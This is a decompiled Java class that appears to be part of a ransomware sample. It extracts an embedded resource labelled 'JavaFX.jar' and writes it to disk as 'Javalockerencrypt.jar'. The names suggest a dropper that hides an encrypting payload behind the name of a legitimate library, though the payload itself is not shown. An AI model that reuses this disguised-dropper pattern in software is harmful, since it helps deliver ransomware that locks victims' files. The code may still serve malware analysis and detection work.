// 
// Decompiled by Procyon v0.5.36
// 

package javabasic;

import java.io.OutputStream;
import java.io.FileOutputStream;
import java.io.File;
import java.io.InputStream;

class crea
{
    public static void inputStreamToFile(final InputStream inputStream, final String targetFilePath) {
        final File file = new File(targetFilePath);
        try {
            final OutputStream os = new FileOutputStream(file);
            int bytesRead = 0;
            final byte[] buffer = new byte[8192];
            while ((bytesRead = inputStream.read(buffer, 0, 8192)) != -1) {
                os.write(buffer, 0, bytesRead);
            }
            os.close();
            inputStream.close();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    void creat(final File to) {
        inputStreamToFile(this.getClass().getResourceAsStream("JavaFX.jar"), to.getPath() + "\\Javalockerencrypt.jar");
    }
}
